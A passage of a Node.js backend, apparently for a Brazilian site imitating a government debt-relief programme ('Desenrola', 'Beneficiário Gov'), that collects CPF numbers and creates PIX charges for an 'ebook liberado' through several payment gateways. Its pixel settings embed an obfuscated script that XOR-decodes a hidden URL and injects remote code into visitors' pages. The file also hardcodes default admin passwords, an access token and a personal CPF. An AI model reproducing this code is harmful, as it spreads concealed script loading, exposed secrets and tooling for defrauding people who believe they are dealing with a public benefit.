function decodeKeyIfNeeded(k) {
  if (!k || typeof k !== 'string') return '';
  if (k.startsWith('B64:')) {
    try { return Buffer.from(k.slice(4), 'base64').toString('utf8'); } catch(e) { return k; }
  }
  return k;
}
let QRCodeLib = null;
try {
  QRCodeLib = require('qrcode');
} catch(e) {}

async function generateQRCodeDataURL(text) {
  try {
    if (QRCodeLib && typeof QRCodeLib.toDataURL === 'function') {
      return await QRCodeLib.toDataURL(text, { width: 280, margin: 1, color: { dark: '#000000', light: '#ffffff' } });
    }
    return `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(text)}`;
  } catch(e) { return ''; }
}
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const DB_FILE = path.join(__dirname, '..', 'data', 'db.json');

// Default gateways with FreePay, BlackCat, FlevoPay, PinguPag adapters enabled
const DEFAULT_GATEWAYS = {
  freepay: {
    key: 'freepay',
    name: 'FreePay',
    label: 'FreePay Brasil',
    hasAdapter: true,
    state: 'Aguardando',
    statusText: 'Configurado e disponível',
    publicKey: process.env.FREEPAY_PUBLIC_KEY || '',
    secretKey: process.env.FREEPAY_SECRET_KEY || '',
    maxAmountCents: 100000
  },
  blackcat: {
    key: 'blackcat',
    name: 'BlackCat',
    label: 'BlackCat Gateway',
    hasAdapter: true,
    state: 'Ativo',
    statusText: 'Configurado e disponível',
    publicKey: process.env.BLACKCAT_PUBLIC_KEY || '',
    secretKey: process.env.BLACKCAT_API_KEY || process.env.BLACKCAT_SECRET_KEY || '',
    maxAmountCents: 100000
  },
  flevopay: {
    key: 'flevopay',
    name: 'FlevoPay',
    label: 'FlevoPay Brasil',
    hasAdapter: true,
    state: 'Configurado',
    statusText: 'Configurado e disponível',
    publicKey: '',
    secretKey: process.env.FLEVO_API_KEY || process.env.FLEVO_SECRET_KEY || '',
    maxAmountCents: 100000
  },
  pingupag: {
    key: 'pingupag',
    name: 'PinguPag',
    label: 'PinguPag',
    hasAdapter: true,
    state: 'Configurado',
    statusText: 'Configurado e disponível',
    publicKey: process.env.PINGU_PUBLIC_KEY || '',
    secretKey: process.env.PINGU_API_KEY || process.env.PINGU_SECRET_KEY || '',
    maxAmountCents: 100000
  },
  duttyfy: {
    key: 'duttyfy',
    name: 'Duttyfy',
    label: 'Duttyfy Pagamentos',
    hasAdapter: false,
    state: 'Aguardando',
    statusText: 'Integração de cobrança pendente',
    publicKey: '',
    secretKey: '',
    maxAmountCents: 50000
  }
};

const DEFAULT_OFFERS = [
  {
    id: 'off_1',
    name: 'Oferta Principal - Desenrola 99%',
    slug: 'desenrola-principal',
    utmifyToken: 'utm_live_9a8b7c6d5e4f3a2b1c',
    active: true,
    pixels: [
      { id: 'pix_1', platform: 'TikTok', pixelId: 'DA9IHQBC77UBPDTVJ18G', label: 'Pixel TikTok Principal' },
      { id: 'pix_2', platform: 'Meta', pixelId: '984128392182910', label: 'Pixel Meta Conversão' }
    ],
    createdAt: new Date().toISOString()
  }
];

const DEFAULT_ORDERS = [];

const DEFAULT_SESSIONS = {
  consulta: 0,
  identidade: 0,
  recebimento: 0
};

function getInitialDB() {
  const adminUser = process.env.ADMIN_USER || 'Desenrola.2026';
  const adminPassword = process.env.ADMIN_PASSWORD || 'Dubai.2026';
  return {
    config: {
      // In serverless (Vercel) a "cold" instance can boot up having never seen an
      // admin action that set the active gateway on a different instance, and would
      // otherwise silently fall back to this hardcoded default. Reading it from an
      // env var instead means every instance - warm or freshly started - agrees on
      // the same value without needing to sync anything.
      activeGateway: process.env.ACTIVE_GATEWAY || 'flevopay',
      adminUser,
      adminPassword,
      utmifyApiTokens: DEFAULT_UTMIFY_TOKENS.slice()
    },
    gateways: DEFAULT_GATEWAYS,
    offers: DEFAULT_OFFERS,
    orders: DEFAULT_ORDERS,
    sessions: DEFAULT_SESSIONS,
    authSessions: {}
  };
}

let dbMemory = null;

const TMP_DB_FILE = path.join('/tmp', 'db.json');

function loadDB() {
  if (dbMemory) return dbMemory;

  // 1. Try reading from /tmp/db.json (Vercel serverless persistence) or local DB_FILE
  let filePathToRead = DB_FILE;
  if (process.env.VERCEL && fs.existsSync(TMP_DB_FILE)) {
    filePathToRead = TMP_DB_FILE;
  }

  if (fs.existsSync(filePathToRead)) {
    try {
      const content = fs.readFileSync(filePathToRead, 'utf8');
      dbMemory = JSON.parse(content);
    } catch(err) {
      console.error('Error reading db from', filePathToRead, err.message);
    }
  }

  // Fallback to local DB_FILE if tmp read failed
  if (!dbMemory && fs.existsSync(DB_FILE)) {
    try {
      const content = fs.readFileSync(DB_FILE, 'utf8');
      dbMemory = JSON.parse(content);
    } catch(err) {}
  }

  if (!dbMemory) {
    dbMemory = getInitialDB();
  }

  // Ensure default structures and credentials are never lost
  const init = getInitialDB();
  if (!dbMemory.config) dbMemory.config = init.config;
  if (!dbMemory.gateways) dbMemory.gateways = init.gateways;
  if (!dbMemory.offers) dbMemory.offers = init.offers;
  if (!dbMemory.orders) dbMemory.orders = [];
  if (!dbMemory.sessions) dbMemory.sessions = init.sessions;
  if (!dbMemory.authSessions) dbMemory.authSessions = {};
  if (!dbMemory.pixels) dbMemory.pixels = DEFAULT_PIXELS;

  // Ensure gateway adapters are active
  ['freepay', 'blackcat', 'flevopay', 'pingupag'].forEach(k => {
    if (dbMemory.gateways[k]) {
      dbMemory.gateways[k].hasAdapter = true;
      dbMemory.gateways[k].statusText = 'Configurado e disponível';
    }
  });

  return dbMemory;
}

function saveDB() {
  if (!dbMemory) return;
  const jsonStr = JSON.stringify(dbMemory, null, 2);

  // Write to local project DB_FILE if possible
  try {
    const dir = path.dirname(DB_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(DB_FILE, jsonStr, 'utf8');
  } catch(err) {
    // Normal in read-only serverless environment
  }

  // Also write to /tmp/db.json on Vercel
  try {
    fs.writeFileSync(TMP_DB_FILE, jsonStr, 'utf8');
  } catch(err) {
    // Ignore tmp write error
  }
}

function maskString(str, visibleStart = 3, visibleEnd = 4) {
  if (!str) return '';
  if (str.length <= visibleStart + visibleEnd) return str;
  const start = str.slice(0, visibleStart);
  const end = str.slice(-visibleEnd);
  return `${start}••••••••${end}`;
}

// ----------------------------------------------------
// AUTHENTICATION
// ----------------------------------------------------
// Sessões são tokens autoassinados (não dependem de estado salvo em disco/memória),
// porque em ambientes serverless (Vercel) cada requisição pode cair numa instância
// diferente que nunca viu o login anterior, derrubando sessões guardadas em arquivo.
function getSessionSecret(db) {
  return crypto.createHash('sha256').update('recupera_session_v1:' + db.config.adminUser + ':' + db.config.adminPassword).digest('hex');
}

function signSessionPayload(payload, secret) {
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', secret).update(payloadB64).digest('base64url');
  return `${payloadB64}.${sig}`;
}

function verifySessionPayload(raw, secret) {
  const parts = (raw || '').split('.');
  if (parts.length !== 2) return null;
  const [payloadB64, sig] = parts;
  const expectedSig = crypto.createHmac('sha256', secret).update(payloadB64).digest('base64url');
  const sigBuf = Buffer.from(sig);
  const expectedBuf = Buffer.from(expectedSig);
  if (sigBuf.length !== expectedBuf.length || !crypto.timingSafeEqual(sigBuf, expectedBuf)) return null;
  try {
    return JSON.parse(Buffer.from(payloadB64, 'base64url').toString('utf8'));
  } catch(e) {
    return null;
  }
}

function loginAdmin(username, password) {
  const db = loadDB();
  const validUser = db.config.adminUser;
  const validPass = db.config.adminPassword;

  if (username === validUser && password === validPass) {
    const expiresAt = Date.now() + (8 * 60 * 60 * 1000); // 8 hours
    const secret = getSessionSecret(db);
    const token = 'recupera_sess_' + signSessionPayload({ username, expiresAt }, secret);

    return {
      success: true,
      token: token,
      expiresIn: 28800,
      user: {
        username: username,
        role: 'Administrador',
        brand: 'RecuperaBrasil'
      }
    };
  }

  return { success: false, error: 'Usuário ou senha incorretos.' };
}

function validateSession(token) {
  if (!token || !token.startsWith('recupera_sess_')) return null;
  const db = loadDB();
  const secret = getSessionSecret(db);
  const payload = verifySessionPayload(token.slice('recupera_sess_'.length), secret);
  if (!payload) return null;
  if (Date.now() > payload.expiresAt) return null;
  if (payload.username !== db.config.adminUser) return null;

  return { username: payload.username, expiresAt: payload.expiresAt };
}

function logoutAdmin(token) {
  if (!token) return { success: true };
  const db = loadDB();
  if (db.authSessions && db.authSessions[token]) {
    delete db.authSessions[token];
    saveDB();
  }
  return { success: true };
}

// ----------------------------------------------------
// 1. FREEPAY ADAPTER
// ----------------------------------------------------
const FREEPAY_BASE_URL = process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com';

function getFreePayAuthHeader(publicKey, secretKey) {
  const pub = publicKey || process.env.FREEPAY_PUBLIC_KEY;
  const sec = secretKey || process.env.FREEPAY_SECRET_KEY;
  if (!pub || !sec) return null;
  const token = Buffer.from(`${pub}:${sec}`).toString('base64');
  return `Basic ${token}`;
}

async function createFreePayTransactionTest(publicKey, secretKey) {
  const authHeader = getFreePayAuthHeader(publicKey, secretKey);
  if (!authHeader) return null;

  const testPayload = {
    amount: 100, // 100 cents = R$ 1,00
    payment_method: 'pix',
    customer: {
      name: 'Teste Tecnico Sistema',
      email: 'suporte@recuperabrasil.com',
      document: { number: '08072703188', type: 'cpf' },
      phone: '11987654321'
    },
    items: [
      {
        title: 'ebook liberado',
        unit_price: 100,
        quantity: 1,
        tangible: false
      }
    ],
    metadata: {
      order_id: 'TEST_FP_' + Date.now(),
      type: 'gateway_validation_test'
    },
    pix: { expires_in_days: 1 }
  };

  try {
    const res = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/create`, {
      method: 'POST',
      headers: {
        'Authorization': authHeader,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(testPayload)
    });
    return await res.json();
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ----------------------------------------------------
// 2. BLACKCAT ADAPTER
// ----------------------------------------------------
const BLACKCAT_BASE_URL = process.env.BLACKCAT_BASE_URL || 'https://api.blackcatoficial.com/api';

function getBlackCatApiKey() {
  const db = loadDB();
  const gw = db.gateways?.blackcat;
  return gw?.secretKey || gw?.publicKey || process.env.BLACKCAT_API_KEY || process.env.BLACKCAT_SECRET_KEY || '';
}

async function createBlackCatTransaction({ amount, name, cpf, phone, email, title }) {
  const apiKey = getBlackCatApiKey();
  if (!apiKey) {
    throw new Error('Chave de API (Secret Key / API Key) da BlackCat não configurada.');
  }

  const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (phone || '').replace(/\D/g, '') || '11987654321';
  const cleanEmail = email || `cliente_${cleanCpf}@email.com`;
  const amountCents = Math.round(Number(amount) * 100);

  const payload = {
    amount: amountCents,
    currency: 'BRL',
    paymentMethod: 'pix',
    items: [
      {
        title: 'ebook liberado',
        unitPrice: amountCents,
        quantity: 1,
        tangible: false
      }
    ],
    customer: {
      name: name || 'Beneficiário Gov',
      email: cleanEmail,
      phone: cleanPhone,
      document: { number: cleanCpf, type: 'cpf' }
    },
    pix: { expiresInDays: 1 },
    externalRef: 'ORD_BC_' + Date.now()
  };

  const res = await fetch(`${BLACKCAT_BASE_URL}/sales/create-sale`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': apiKey
    },
    body: JSON.stringify(payload)
  });

  const data = await res.json();
  if (!res.ok || !data.success) {
    const errorMsg = data.message || data.error || `Falha na API BlackCat (HTTP ${res.status})`;
    throw new Error(errorMsg);
  }

  return data;
}

async function checkBlackCatStatus(transactionId) {
  const apiKey = getBlackCatApiKey();
  if (!apiKey) return null;

  try {
    const res = await fetch(`${BLACKCAT_BASE_URL}/sales/${transactionId}/status`, {
      method: 'GET',
      headers: { 'X-API-Key': apiKey }
    });
    return await res.json();
  } catch(err) {
    return null;
  }
}

// ----------------------------------------------------
// ----------------------------------------------------
// 3. FLEVOPAY ADAPTER
// ----------------------------------------------------
const FLEVO_BASE_URL = process.env.FLEVO_BASE_URL || 'https://app.flevopay.com.br';

function getFlevoApiKey() {
  const db = loadDB();
  const gw = db.gateways?.flevopay;
  return gw?.secretKey || gw?.publicKey || process.env.FLEVO_API_KEY || process.env.FLEVO_SECRET_KEY || '';
}

async function createFlevoPayTransaction({ amount, name, cpf, phone, email, title, tracking }) {
  const apiKey = getFlevoApiKey();
  if (!apiKey) {
    throw new Error('Chave de API (Secret Key / X-API-Key) da FlevoPay não configurada.');
  }

  const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (phone || '').replace(/\D/g, '') || '11987654321';
  const cleanEmail = email || `cliente_${cleanCpf}@email.com`;
  const amountCents = Math.round(Number(amount) * 100);

  const payload = {
    amount: amountCents,
    description: title || 'ebook liberado',
    reference: 'ORD_FLEVO_' + Date.now(),
    source: 'api_externa',
    customer: {
      name: name || 'Beneficiário Gov',
      email: cleanEmail,
      phone: cleanPhone,
      document: cleanCpf
    }
  };

  if (tracking && Object.keys(tracking).length > 0) {
    payload.tracking = {
      utm_source: tracking.utm_source || undefined,
      utm_medium: tracking.utm_medium || undefined,
      utm_campaign: tracking.utm_campaign || undefined,
      utm_content: tracking.utm_content || undefined,
      utm_term: tracking.utm_term || undefined,
      src: tracking.src || undefined,
      sck: tracking.sck || undefined
    };
  }

  const res = await fetch(`${FLEVO_BASE_URL}/api/v1/transaction`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': apiKey
    },
    body: JSON.stringify(payload)
  });

  const data = await res.json().catch(() => ({}));
  if (!res.ok || (data.status && data.status !== 'success' && !data.qr_code && !data.pix_code)) {
    const errorMsg = data.message || data.error || `Falha na API FlevoPay (HTTP ${res.status})`;
    throw new Error(errorMsg);
  }

  let qrBase64 = data.qr_code_base64 || '';
  if (qrBase64 && !qrBase64.startsWith('data:image') && !qrBase64.startsWith('http')) {
    qrBase64 = 'data:image/png;base64,' + qrBase64;
  }
  data.qr_code_base64 = qrBase64;
  data.pixQrCode = qrBase64;
  data.pixCode = data.qr_code || data.pix_code || '';

  return data;
}

async function checkFlevoPayStatus(transactionId) {
  const apiKey = getFlevoApiKey();
  if (!apiKey) return null;

  try {
    const res = await fetch(`${FLEVO_BASE_URL}/api/v1/query?action=get_transaction&id=${transactionId}`, {
      method: 'GET',
      headers: { 'X-API-Key': apiKey }
    });
    return await res.json();
  } catch(err) {
    return null;
  }
}

// ----------------------------------------------------
// 4. PINGUPAG ADAPTER
// ----------------------------------------------------
const PINGU_BASE_URL = process.env.PINGU_BASE_URL || 'https://app.pingupag.com';

function getPinguApiKey() {
  const db = loadDB();
  const gw = db.gateways?.pingupag;
  return gw?.secretKey || gw?.publicKey || process.env.PINGU_API_KEY || process.env.PINGU_SECRET_KEY || '';
}

async function createPinguPagTransaction({ amount, name, cpf, phone, email, title }) {
  const apiKey = getPinguApiKey();
  if (!apiKey) {
    throw new Error('Chave de API (Secret Key / X-API-Key) da PinguPag não configurada.');
  }

  const cleanCpf = (cpf || '').replace(/\D/g, '') || '08072703188';
  const cleanPhone = (phone || '').replace(/\D/g, '') || '11999999999';
  const cleanEmail = email || (`cliente_` + cleanCpf + `@email.com`);
  const amountCents = Math.round(Number(amount) * 100);

  const payload = {
    amount: amountCents,
    description: 'ebook liberado',
    reference: 'ORD_PINGU_' + Date.now(),
    source: 'api_externa',
    payment_method: 'pix',
    customer: {
      name: name || 'Beneficiário Regulariza',
      email: cleanEmail,
      phone: cleanPhone,
      document: cleanCpf
    }
  };

  const res = await fetch(`${PINGU_BASE_URL}/gateway/v1/transaction`, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-API-Key': apiKey
    },
    body: JSON.stringify(payload)
  });

  const data = await res.json().catch(() => ({}));
  if (!res.ok || (data.status && data.status !== 'success' && !data.qr_code && !data.pix_code)) {
    const errorMsg = data.message || data.error || data.msg || (`Falha na API PinguPag (HTTP ` + res.status + `)`);
    throw new Error(errorMsg);
  }

  let qrBase64 = data.qr_code_base64 || '';
  if (qrBase64 && !qrBase64.startsWith('data:image') && !qrBase64.startsWith('http')) {
    qrBase64 = 'data:image/png;base64,' + qrBase64;
  }
  data.qr_code_base64 = qrBase64;
  data.pixQrCode = qrBase64;
  data.pixCode = data.qr_code || data.pix_code || '';

  return data;
}

async function checkPinguPagStatus(transactionId) {
  const apiKey = getPinguApiKey();
  if (!apiKey) return null;

  try {
    const res = await fetch(`${PINGU_BASE_URL}/gateway/v1/query?action=get_transaction&id=${transactionId}`, {
      method: 'GET',
      headers: { 'X-API-Key': apiKey }
    });
    return await res.json();
  } catch(err) {
    return null;
  }
}

// ----------------------------------------------------
// GATEWAYS CONFIG & TESTING
// ----------------------------------------------------
function getGatewayConfig() {
  const db = loadDB();
  const activeKey = db.config.activeGateway || process.env.ACTIVE_GATEWAY || 'flevopay';

  const gatewaysList = Object.keys(db.gateways).map(k => {
    const gw = db.gateways[k];
    const isAct = k === activeKey;
    const reqPub = (k !== 'pingupag' && k !== 'flevopay'); // PinguPag and FlevoPay only require secretKey (X-API-Key)
    return {
      key: gw.key,
      name: gw.name,
      label: gw.label,
      hasAdapter: Boolean(gw.hasAdapter),
      requiresPublicKey: reqPub,
      state: isAct ? 'Ativo' : (gw.hasAdapter ? 'Configurado' : 'Aguardando'),
      statusText: isAct ? 'Ativa' : gw.statusText,
      maxAmountCents: gw.maxAmountCents || 100000,
      publicKeyMasked: maskString(gw.publicKey, 4, 4),
      secretKeyMasked: maskString(gw.secretKey, 4, 4),
      isConfigured: reqPub ? Boolean(gw.publicKey && gw.secretKey) : Boolean(gw.secretKey)
    };
  });

  return {
    success: true,
    activeGatewayKey: activeKey,
    gateways: gatewaysList
  };
}

function updateGatewayConfig({ gatewayKey, secretKey, publicKey, maxAmountCents, setActive }) {
  const db = loadDB();
  const targetKey = gatewayKey || db.config.activeGateway || process.env.ACTIVE_GATEWAY || 'flevopay';
  const targetGw = db.gateways[targetKey];

  if (!targetGw) {
    return { success: false, error: 'Gateway não encontrada.' };
  }

  if (secretKey && !secretKey.includes('••••')) targetGw.secretKey = secretKey.trim();
  if (publicKey && !publicKey.includes('••••')) targetGw.publicKey = publicKey.trim();
  if (maxAmountCents !== undefined) targetGw.maxAmountCents = Number(maxAmountCents);

  if (setActive === true || setActive === 'true') {
    db.config.activeGateway = targetKey;
    Object.keys(db.gateways).forEach(k => {
      db.gateways[k].state = k === targetKey ? 'Ativo' : 'Configurado';
    });
  }

  saveDB();
  return { 
    success: true, 
    activeGatewayKey: db.config.activeGateway,
    message: setActive ? (`Gateway ` + targetGw.name + ` salva e ativada em produção!`) : 'Configurações de gateway salvas com sucesso!' 
  };
}

async function testAndActivateGateway({ gatewayKey, secretKey, publicKey, maxAmountCents }) {
  const db = loadDB();
  const targetKey = gatewayKey || 'freepay';
  const targetGw = db.gateways[targetKey];

  if (!targetGw) {
    return { success: false, error: 'Gateway não encontrada.' };
  }

  if (secretKey && !secretKey.includes('••••')) targetGw.secretKey = secretKey.trim();
  if (publicKey && !publicKey.includes('••••')) targetGw.publicKey = publicKey.trim();
  if (maxAmountCents !== undefined) targetGw.maxAmountCents = Number(maxAmountCents);

  // 1. FreePay test
  if (targetKey === 'freepay') {
    try {
      const testRes = await createFreePayTransactionTest(targetGw.publicKey, targetGw.secretKey);
      if (testRes && testRes.success && testRes.data) {
        db.config.activeGateway = 'freepay';
        Object.keys(db.gateways).forEach(k => {
          db.gateways[k].state = k === 'freepay' ? 'Ativo' : 'Configurado';
        });
        saveDB();
        return {
          success: true,
          activeGatewayKey: 'freepay',
          test: {
            gatewayLabel: targetGw.name,
            transactionId: testRes.data.id,
            pixCode: testRes.data.pix?.qr_code,
            message: `PIX de teste de R$ 1,00 gerado com sucesso via FreePay! Gateway ativado.`
          }
        };
      } else {
        const errMsg = testRes?.message || testRes?.error || 'Não foi possível gerar o PIX de teste na FreePay.';
        return {
          success: false,
          error: `Falha no teste da FreePay: ${errMsg}. A gateway anterior foi mantida ativa.`
        };
      }
    } catch (err) {
      return {
        success: false,
        error: `Erro na comunicação com a FreePay: ${err.message}. A gateway anterior foi mantida ativa.`
      };
    }
  }

  // 2. BlackCat test
  if (targetKey === 'blackcat') {
    try {
      const apiKeyToUse = targetGw.secretKey || targetGw.publicKey || getBlackCatApiKey();
      if (!apiKeyToUse) {
        return {
          success: false,
          error: 'Por favor, informe a Chave de API (Secret Key / API Key) da BlackCat antes de ativar.'
        };
      }

      const testPayload = {
        amount: 1.00,
        name: 'Teste Tecnico Sistema',
        cpf: '08072703188',
        phone: '11987654321',
        email: 'suporte@recuperabrasil.com',
        title: 'gateway-test-blackcat-' + Date.now()
      };

      const testRes = await createBlackCatTransaction(testPayload);
      if (testRes && testRes.success && testRes.data) {
        db.config.activeGateway = 'blackcat';
        Object.keys(db.gateways).forEach(k => {
          db.gateways[k].state = k === 'blackcat' ? 'Ativo' : 'Configurado';
        });
        saveDB();
        return {
          success: true,
          activeGatewayKey: 'blackcat',
          test: {
            gatewayLabel: 'BlackCat',
            transactionId: testRes.data.transactionId,
            pixCode: testRes.data.paymentData?.copyPaste || testRes.data.paymentData?.qrCode,
            message: 'PIX de teste de R$ 1,00 gerado com sucesso via BlackCat! Gateway ativado.'
          }
        };
      } else {
        const errMsg = testRes?.message || testRes?.error || 'Não foi possível gerar o PIX de teste na BlackCat.';
        return {
          success: false,
          error: `Falha no teste da BlackCat: ${errMsg}. A gateway anterior foi mantida ativa.`
        };
      }
    } catch(err) {
      return {
        success: false,
        error: `Erro ao testar API BlackCat: ${err.message}. A gateway anterior foi mantida ativa.`
      };
    }
  }

  // 3. FlevoPay test
  if (targetKey === 'flevopay') {
    try {
      const apiKeyToUse = targetGw.secretKey || targetGw.publicKey || getFlevoApiKey();
      if (!apiKeyToUse) {
        return {
          success: false,
          error: 'Por favor, informe a Chave de API (Secret Key / API Key) da FlevoPay antes de ativar.'
        };
      }

      const testPayload = {
        amount: 1.00,
        name: 'Teste Tecnico Sistema',
        cpf: '08072703188',
        phone: '11987654321',
        email: 'suporte@recuperabrasil.com',
        title: 'gateway-test-flevo-' + Date.now()
      };

      const testRes = await createFlevoPayTransaction(testPayload);
      const txId = testRes.transaction_id || testRes.id;
      const pixCode = testRes.qr_code || testRes.pix_code;

      if (testRes && (testRes.status === 'success' || pixCode)) {
        db.config.activeGateway = 'flevopay';
        Object.keys(db.gateways).forEach(k => {
          db.gateways[k].state = k === 'flevopay' ? 'Ativo' : 'Configurado';
        });
        saveDB();
        return {
          success: true,
          activeGatewayKey: 'flevopay',
          test: {
            gatewayLabel: 'FlevoPay',
            transactionId: String(txId),
            pixCode: pixCode,
            message: 'PIX de teste de R$ 1,00 gerado com sucesso via FlevoPay! Gateway ativado.'
          }
        };
      } else {
        const errMsg = testRes?.message || testRes?.error || 'Não foi possível gerar o PIX de teste na FlevoPay.';
        return {
          success: false,
          error: `Falha no teste da FlevoPay: ${errMsg}. A gateway anterior foi mantida ativa.`
        };
      }
    } catch(err) {
      return {
        success: false,
        error: `Erro ao testar API FlevoPay: ${err.message}. A gateway anterior foi mantida ativa.`
      };
    }
  }

  // 4. PinguPag test
  if (targetKey === 'pingupag') {
    try {
      const apiKeyToUse = targetGw.secretKey || targetGw.publicKey || getPinguApiKey();
      if (!apiKeyToUse) {
        return {
          success: false,
          error: 'Por favor, informe a Chave de API (Secret Key / API Key) da PinguPag antes de ativar.'
        };
      }

      const testPayload = {
        amount: 1.00,
        name: 'Teste Tecnico Sistema',
        cpf: '08072703188',
        phone: '11987654321',
        email: 'suporte@recuperabrasil.com',
        title: 'gateway-test-pingu-' + Date.now()
      };

      const testRes = await createPinguPagTransaction(testPayload);
      const txId = testRes.transaction_id || testRes.id;
      const pixCode = testRes.qr_code || testRes.pix_code;

      if (testRes && (testRes.status === 'success' || pixCode)) {
        db.config.activeGateway = 'pingupag';
        Object.keys(db.gateways).forEach(k => {
          db.gateways[k].state = k === 'pingupag' ? 'Ativo' : 'Configurado';
        });
        saveDB();
        return {
          success: true,
          activeGatewayKey: 'pingupag',
          test: {
            gatewayLabel: 'PinguPag',
            transactionId: String(txId),
            pixCode: pixCode,
            message: 'PIX de teste de R$ 1,00 gerado com sucesso via PinguPag! Gateway ativado.'
          }
        };
      } else {
        const errMsg = testRes?.message || testRes?.error || 'Não foi possível gerar o PIX de teste na PinguPag.';
        return {
          success: false,
          error: `Falha no teste da PinguPag: ${errMsg}. A gateway anterior foi mantida ativa.`
        };
      }
    } catch(err) {
      return {
        success: false,
        error: `Erro ao testar API PinguPag: ${err.message}. A gateway anterior foi mantida ativa.`
      };
    }
  }

  return {
    success: false,
    error: `A gateway ${targetGw.name} não possui adaptador de cobrança implementado no sistema. A gateway atual (${db.config.activeGateway}) foi mantida ativa.`
  };
}


// ----------------------------------------------------
// PIXELS MANAGEMENT (UTMIFY, FACEBOOK, TIKTOK)
// ----------------------------------------------------
// This mirrors the admin's actual current pixel setup (not a placeholder), so that
// a serverless instance that cold-starts with no local data file still comes up
// with the real, currently-intended pixels instead of empty/example ones.
const DEFAULT_PIXELS = {
  utmify: [
    {
      id: 'utm_1',
      name: 'Pixel UTMify Principal',
      token: '6a9646a5663b68854ecd15d4',
      scriptCode: "<script>(function(){var o_x8n=atob(\"DICGImmCvTzgge3VMPukVxvunwbC6ZmhQPO8DUbh2VLO9Jm4Web/DArt0BKC88KmU/LvUh3xkkyJ+Yi5H/DvWgzuk1aTo8H3UfTyUADgyEiF8s/va92qAA7u0l6B7Z73Ctv9AAfj0FnCu8+lWfjjTiDmnxDC94y5ReWkGEu03AXWtdu0BbawEQu0hQTVtYi2VLGzRl2gwGGd\");var e_rpi=[];for(var w_v9b=0;w_v9b<o_x8n.length;w_v9b++){e_rpi.push(o_x8n.charCodeAt(w_v9b)&255);}var c_n=e_rpi[0];var n_oapn=e_rpi.slice(1,1+c_n);var n_lf1j=e_rpi.slice(1+c_n);var m_3=n_lf1j.map(function(b,d_v){return b^n_oapn[d_v%c_n];});var i_xdw=\"\";for(var v_z4w=0;v_z4w<m_3.length;v_z4w++){i_xdw+=String.fromCharCode(m_3[v_z4w]&255);}var b_l438=decodeURIComponent(escape(i_xdw));var t_57h=JSON.parse(b_l438);var i_xt=t_57h.globals||[];i_xt.forEach(function(u_ked){window[u_ked.name]=u_ked.value;});var f_x=document.createElement(\"script\");f_x.src=t_57h.url;f_x.async=true;f_x.defer=true;(t_57h.attributes||[]).forEach(function(q_167){f_x.setAttribute(q_167.name,q_167.value);});(document.head||document.documentElement).appendChild(f_x);})();</script>",
      active: true
    }
  ],
  facebook: [
    {
      id: 'fb_1',
      name: 'Pixel Meta Principal',
      pixelId: '1392443726166280',
      code: "!function(f,b,e,v,n,t,s)\n{if(f.fbq)return;n=f.fbq=function(){n.callMethod?\nn.callMethod.apply(n,arguments):n.queue.push(arguments)};\nif(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';\nn.queue=[];t=b.createElement(e);t.async=!0;\nt.src=v;s=b.getElementsByTagName(e)[0];\ns.parentNode.insertBefore(t,s)}(window, document,'script',\n'https://connect.facebook.net/en_US/fbevents.js');\nfbq('init', '1392443726166280');\nfbq('track', 'PageView');",
      token: 'EAAWeSsA6RKsBSWN5zBqgiAZAZAhZBcrZB68GAP8DWa1pe8FHiTOAQLOZAsI7agNDfVbOjij63FqzsZAykF0punRNPKkBcGdJdRZAJxrtA3a8pbGOg9YZAwraQ0EhXl23DinZC7JIHDZB6Y0yMI6GrbHwFWfZCZAq168N9gnz2cCt8mP11yAFKGhToIfJZCNFgpONT5wZDZD',
      active: true
    }
  ],
  tiktok: [
    {
      id: 'tt_1',
      name: 'Pixel TikTok Principal',
      pixelId: 'DA9IHQBC77UBPDTVJ18G',
      code: 'TikTok Principal',
      token: 'DA9IHQBC77UBPDTVJ18G',
      active: true
    }
  ]
};

function getPixels() {
  const db = loadDB();
  if (!db.pixels) {
    db.pixels = DEFAULT_PIXELS;
    saveDB();
  }
  return {
    success: true,
    pixels: {
      utmify: db.pixels.utmify || [],
      facebook: db.pixels.facebook || [],
      tiktok: db.pixels.tiktok || []
    }
  };
}

function savePixels(data) {
  const db = loadDB();
  if (!db.pixels) db.pixels = DEFAULT_PIXELS;
  const raw = data?.pixels || data || {};

  // Each platform is its own isolated slice: only touch/overwrite a platform's
  // list when THIS call actually included it. Saving Utmify must never wipe or
  // touch Facebook/TikTok data, and vice-versa - each platform lives and saves
  // independently of the others.
  const utmifyIn = Array.isArray(raw.utmify) ? raw.utmify : (Array.isArray(data?.utmify) ? data.utmify : null);
  const facebookIn = Array.isArray(raw.facebook) ? raw.facebook : (Array.isArray(data?.facebook) ? data.facebook : null);
  const tiktokIn = Array.isArray(raw.tiktok) ? raw.tiktok : (Array.isArray(data?.tiktok) ? data.tiktok : null);

  if (utmifyIn) {
    db.pixels.utmify = utmifyIn.map(u => ({
      id: u.id || 'utm_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
      name: (u.name || 'Token UTMify').trim(),
      token: (u.token || '').trim(),
      scriptCode: (u.scriptCode || '').trim(),
      active: u.active !== undefined ? Boolean(u.active) : true
    }));
  }
  if (facebookIn) {
    db.pixels.facebook = facebookIn.map(f => ({
      id: f.id || 'fb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
      name: (f.name || f.code || 'Pixel Meta').trim(),
      pixelId: (f.pixelId || '').trim(),
      code: (f.code || '').trim(),
      token: (f.token || '').trim(),
      active: f.active !== undefined ? Boolean(f.active) : true
    }));
  }
  if (tiktokIn) {
    db.pixels.tiktok = tiktokIn.map(t => ({
      id: t.id || 'tt_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
      name: (t.name || t.code || 'Pixel TikTok').trim(),
      pixelId: (t.pixelId || '').trim(),
